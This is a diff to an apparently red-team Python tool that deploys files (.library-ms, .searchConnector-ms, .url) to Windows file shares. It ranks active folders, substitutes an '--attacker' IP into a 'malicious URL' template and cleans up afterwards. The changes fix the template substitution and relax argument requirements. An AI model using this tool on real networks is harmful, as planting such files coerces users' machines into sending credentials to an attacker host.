@@ -119,7 +119,8 @@ def is_valid_payload_name(payload_name, available_extensions):
     Accepts a potential payload name. Validates the payload name has an extension and that the
     extension is supported. Returns True if the payload name is valid or False if it is not.
     """
-    invalid_payload_message = 'Invalid payload extension provided. Payload must end in one of the following:'
+    invalid_payload_message = 'Invalid payload extension provided. Payload must end in one of the'\
+                              'following:'
     for available_extension in available_extensions:
         invalid_payload_message = invalid_payload_message + (f'\n\t.{available_extension}')
 
@@ -276,35 +277,33 @@ def main():
                         'share')
     parser.add_argument('--password', required=True, help='Password for authenticating to each '
                         'share')
-    parser.add_argument('--domain', required=True, help='Domain for authenticating to each share')
+    parser.add_argument('--domain', required=True, help='Domain for authenticating to each share.'
+                        'Specify "." for local authentication')
     parser.add_argument('--targets', required=True,
                         help='Path to a text file containing UNC paths to file shares / base '
-                            'directories for deployment or from which to remove payload files')
+                        'directories for deployment or from which to remove payload files')
 
     # For ranking and identification
-    parser.add_argument('--max-depth', type=int, default=3, required='--identify' in sys.argv or
-                        '--rank' in sys.argv, help='The maximum depth of folders to search within '
-                        'the target')
-    parser.add_argument('--active-threshold', type=int, default=2, required='--identify' in
-                        sys.argv or '--rank' in sys.argv, help='Number of days as an integer for '
-                        'active files')
-    parser.add_argument('--fast', action='store_true', default=False, required='--identify' in
-                        sys.argv or '--rank' in sys.argv, help='Mark folders active as soon as one'
-                        ' active file in them is identified and move on. Scores are not assigned.')
+    parser.add_argument('--max-depth', type=int, default=3, help='The maximum depth of folders to '
+                        'search within the target')
+    parser.add_argument('--active-threshold', type=int, default=2, help='Number of days as an '
+                        'integer for active files')
+    parser.add_argument('--fast', action='store_true', default=False, help='Mark folders active as'
+                        ' soon as one active file in them is identified and move on. Ranks are '
+                        'all set to 1 assigned.')
 
     # For identification
-    parser.add_argument('--max-folders-per-target', type=int, default=10, required='--identify' in
-                        sys.argv, help='Maximum number of folders to output as deployment targets '
-                        'per supplied target share or folder.')
+    parser.add_argument('--max-folders-per-target', type=int, default=10, help='Maximum number of '
+                        'folders to output as deployment targets per supplied target share or '
+                        'folder.')
 
     # For deployment
     parser.add_argument('--attacker', required='--deploy' in sys.argv,
                         help='Attacker IP or hostname to place in malicious URL')
 
     # For deployment and cleanup
-    parser.add_argument('--payload', default='@Test_Do_Not_Remove.searchConnector-ms',
-                        required='--deploy' in sys.argv or '--cleanup' in sys.argv, help='Name of '
-                        'payload file ending in .library-ms, .searchConnector-ms, or .url')
+    parser.add_argument('--payload', default='@Test_Do_Not_Remove.searchConnector-ms', help='Name '
+                        'of payload file ending in .library-ms, .searchConnector-ms, or .url')
 
     # Modes
     parser.add_argument('--rank', action='store_true', help='Output identified subfolders '
@@ -356,7 +355,8 @@ def main():
         # Read the payload template contents into a file and substitute the attacker IP or hostname
         with open(template_name, 'r', encoding="utf-8") as template_file:
             payload_contents = template_file.read()
-            payload_contents.format(attacker_ip=args.attacker)
+            payload_contents = payload_contents.format(attacker_ip=args.attacker)
+
 
         # Iterate over each target folder path
         for folder_unc in targets:
